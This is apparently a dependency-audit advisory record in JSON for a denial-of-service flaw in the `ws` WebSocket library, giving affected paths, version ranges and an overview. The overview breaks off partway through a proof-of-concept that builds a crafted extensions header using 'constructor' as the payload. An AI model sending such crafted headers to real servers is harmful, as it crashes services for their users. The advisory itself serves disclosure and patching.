{"type":"auditAdvisory","data":{"resolution":{"id":550,"path":"ember-data>testem>socket.io>engine.io>ws","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"1.1.1","paths":["ember-cli>testem>socket.io>engine.io>ws","ember-data>testem>socket.io>engine.io>ws","ember-cli>testem>socket.io>socket.io-client>engine.io-client>ws","ember-data>testem>socket.io>socket.io-client>engine.io-client>ws"]}],"id":550,"created":"2017-11-08T19:25:17.211Z","updated":"2019-06-24T14:54:52.443Z","deleted":null,"title":"Denial of Service","found_by":{"name":"Nick Starke, Ryan Knell"},"reported_by":{"name":"Nick Starke, Ryan Knell"},"module_name":"ws","cves":[],"vulnerable_versions":"<1.1.5 || >=2.0.0 <3.3.1","patched_versions":">= 1.1.5 <2.0.0 || >=3.3.1","overview":"Affected versions of `ws` can crash when a specially crafted `Sec-WebSocket-Extensions` header containing `Object.prototype` property names as extension or parameter names is sent.

## Proof of concept

```
const WebSocket = require('ws');
const net = require('net');

const wss = new WebSocket.Server({ port: 3000 }, function () {
  const payload = 'constructor';  // or ',;constructor'

  const request = [
    'GET / HTTP/1.1',
    'Connection: Upgrade',
